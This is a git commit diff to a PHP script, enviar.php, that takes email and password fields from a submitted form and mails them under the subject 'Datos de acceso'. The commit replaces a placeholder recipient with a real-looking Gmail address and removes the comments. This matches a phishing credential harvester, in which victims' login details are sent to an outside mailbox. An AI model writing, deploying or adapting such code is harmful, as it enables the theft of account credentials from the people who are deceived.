70598cc60462650d246f146e7b2e76a36df6f603
trabajotico <lisatibrey06@outlook.com>
2024-06-05 14:31:33 -0400

    Update enviar.php

--- enviar.php
+++ enviar.php
@@ -3,13 +3,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $email = $_POST['email'];
     $password = $_POST['password'];
     
-    // Cambia esta dirección de correo electrónico por la tuya
-    $to = "tucorreo@example.com";
+    $to = "el.ratata0001@gmail.com";
     $subject = "Datos de acceso";
     $message = "Correo electrónico: $email \nContraseña: $password";
     $headers = "From: $email";
 
-    // Envía el correo electrónico
+    
     if (mail($to, $subject, $message, $headers)) {
         echo "¡Correo enviado correctamente!";
     } else {
